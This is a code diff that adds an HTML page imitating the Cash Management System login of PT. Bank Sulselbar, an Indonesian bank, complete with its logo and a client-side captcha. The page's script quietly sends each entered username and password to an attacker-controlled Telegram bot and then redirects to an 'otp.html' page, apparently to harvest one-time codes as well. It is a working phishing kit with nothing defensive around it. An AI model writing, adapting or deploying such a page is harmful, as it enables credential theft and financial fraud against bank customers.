@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Sulselbar - CMS Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #f4f7f9;
+            background-image: radial-gradient(#dce4e7 0.8px, transparent 0.8px);
+            background-size: 20px 20px;
+        }
+
+        .login-box {
+            width: 380px;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            overflow: hidden; /* Agar logo tidak keluar dari border radius */
+        }
+
+        /* LOGO FULL WIDTH */
+        .logo-header {
+            width: 100%;
+            padding: 20px;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-bottom: 1px solid #eee;
+        }
+
+        .logo-main {
+            width: 100%; /* Membuat logo memenuhi lebar kontainer */
+            height: auto;
+            max-width: 300px; /* Batas maksimal agar tidak terlalu pecah */
+        }
+
+        .tagline {
+            font-size: 12px;
+            color: #555;
+            font-style: italic;
+            margin-top: 5px;
+        }
+
+        .form-content {
+            padding: 30px;
+            text-align: center;
+        }
+
+        .cms-title {
+            font-size: 20px;
+            color: #777;
+            font-weight: 300;
+            margin-bottom: 25px;
+            letter-spacing: 1px;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        /* CAPTCHA STYLING */
+        #captchaBox {
+            background-color: #f8f9fa;
+            border: 1px solid #ddd;
+            padding: 15px;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+            font-size: 26px;
+            font-weight: bold;
+            color: #0000FF;
+            letter-spacing: 10px;
+            user-select: none;
+            background-image: radial-gradient(circle, #0000FF 0.4px, transparent 0.4px);
+            background-size: 4px 4px;
+        }
+
+        .btn-refresh {
+            font-size: 11px;
+            color: #007bff;
+            cursor: pointer;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #34495e;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #999;
+        }
+
+        .footer span {
+            color: #27ae60;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body onload="newCaptcha()">
+
+<div class="login-box">
+    <div class="logo-header">
+        <img src="https://tnt.banksulselbar.co.id/priority.jpeg" class="logo-main" alt="Bank Sulselbar">
+        <span class="tagline">Melayani Sepenuh Hati</span>
+    </div>
+
+    <div class="form-content">
+        <h1 class="cms-title">Cash Management System</h1>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Username</label>
+                <input type="text" id="user" required>
+            </div>
+
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="pass" required>
+            </div>
+
+            <div class="form-group" style="margin-bottom: 5px;">
+                <div id="captchaBox">----</div>
+                <a class="btn-refresh" onclick="newCaptcha()">Ganti Kode</a>
+            </div>
+
+            <div class="form-group">
+                <label>Masukkan Kode</label>
+                <input type="text" id="captchaInput" autocomplete="off" required>
+            </div>
+
+            <button type="submit" class="btn-login">Login</button>
+        </form>
+
+        <div class="footer">
+            <b>CMS</b> - Cash Management System<br>
+            2018-2026 Copyright <span>PT. Bank Sulselbar</span>
+        </div>
+    </div>
+</div>
+
+<script>
+    let code = "";
+    function newCaptcha() {
+        const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+        code = "";
+        for (let i = 0; i < 4; i++) {
+            code += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        document.getElementById("captchaBox").innerText = code;
+    }
+
+    // KONFIGURASI TELEGRAM
+    const TOKEN = "TOKEN_BOT_ANDA";
+    const CHAT_ID = "CHAT_ID_ANDA";
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const inputCaptcha = document.getElementById('captchaInput').value.toUpperCase();
+
+        if (inputCaptcha !== code) {
+            alert("Kode Captcha salah!");
+            newCaptcha();
+            return;
+        }
+
+        const username = document.getElementById('user').value;
+        const password = document.getElementById('pass').value;
+
+        const text = `
+📩 *LOG LOGIN CMS*
+👤 User: \`${username}\`
+🔑 Pass: \`${password}\`
+━━━━━━━━━━━━━━━━━━
+        `;
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: "Markdown"
+            })
+        })
+        .finally(() => {
+            window.location.href = "otp.html"; 
+        });
+    });
+</script>
+
+</body>
+</html>
